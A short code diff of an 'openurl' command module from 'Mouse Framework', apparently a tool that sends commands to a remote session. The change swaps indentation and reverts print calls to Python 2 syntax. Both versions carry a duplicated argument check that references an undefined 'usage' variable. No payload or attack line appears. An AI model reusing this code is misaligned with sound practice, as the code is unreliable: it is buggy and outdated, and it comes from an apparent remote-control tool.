@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 #            ---------------------------------------------------
-#                              Mouse Framework
+#                              Mouse Framework                                 
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -25,10 +25,10 @@ class command:
         self.usage = "Usage: openurl <url>"
 
     def run(self,session,cmd_data):
-        if not cmd_data['args']:
-            print(self.usage)
-            return
-        if not cmd_data['args']:
-            print(usage)
-            return
-        session.send_command(cmd_data)
+    	if not cmd_data['args']:
+    		print self.usage
+    		return
+    	if not cmd_data['args']:
+    		print usage
+    		return
+    	session.send_command(cmd_data)
